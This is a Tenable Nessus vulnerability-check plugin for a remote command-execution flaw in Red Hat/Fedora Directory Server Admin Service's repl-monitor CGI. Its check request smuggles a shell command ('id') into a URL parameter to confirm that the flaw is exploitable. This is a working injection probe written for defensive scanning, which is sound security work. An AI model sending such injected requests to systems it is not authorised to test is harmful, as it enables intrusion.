#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(32032);
 script_version("$Revision: 1.13 $");

 script_cve_id("CVE-2008-0892","CVE-2008-0893");
 script_bugtraq_id(28802);
 script_osvdb_id(44456, 44457);
 script_xref(name:"RHSA", value:"2008:0199");
 script_xref(name:"RHSA", value:"2008:0201");
  
 script_name(english:"Red Hat Administration Server (redhat-ds-admin) Multiple Remote Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that is prone to arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"The remote host is running RedHat or Fedora Directory Server Admin
Service. 

The version of this software installed on the remote host is
vulnerable to remote command execution flaw through the argument
'admurl' of the script '/bin/admin/admin/bin/download'.  A malicious
user could exploit this flaw to execute arbitrary commands on the
remote host." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to ds-admin 1.1.4 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
 script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');
 script_cwe_id(20, 264);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/04/23");
 script_cvs_date("$Date: 2016/12/09 20:54:57 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
 script_summary(english:"Checks for RedHat/Fedora Directory Server repl-monitor-cgi.pl remote command execution flaw");
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");

 script_dependencie("http_version.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 9830);
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

banner = get_http_banner(port:9830);
if ("Server: Apache" >!< banner) exit(0);

http_check_remote_code (
                        default_port:9830,
			unique_dir:"/dist",
			check_request:'/repl-monitor-cgi.pl?admurl=toto&plop=";id;"',
			extra_check:"<p>Error: Missing configuration file.",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id"
			);
